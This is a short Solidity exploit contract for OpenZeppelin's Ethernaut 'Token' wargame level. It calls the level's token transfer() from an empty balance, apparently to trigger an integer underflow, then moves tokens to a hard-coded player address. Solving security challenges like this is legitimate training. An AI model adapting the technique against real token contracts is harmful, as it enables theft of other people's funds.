// SPDX-License-Identifier: MIT
// Original challenge at: https://ethernaut.openzeppelin.com/level/0xB4802b28895ec64406e45dB504149bfE79A38A57
pragma solidity ^0.8.0;

contract TokenTransfer {

  address public owner;
  Token token;
  address level = 0x0f5442Cb9d6a2E39417F38a14038b76813B6b2e7;
  address player = 0x8AC67F78c19a27f68c783F7283d5Db4cEc3366Ee;

  constructor() {
    token = Token(level);
  }

  function tokenTransfer(uint initialValue, uint transferValue) public {
    token.transfer(address(this), initialValue);
    token.transfer(player, transferValue);
  }
}

abstract contract Token {
    function transfer(address _to, uint _value) external virtual returns(bool);
}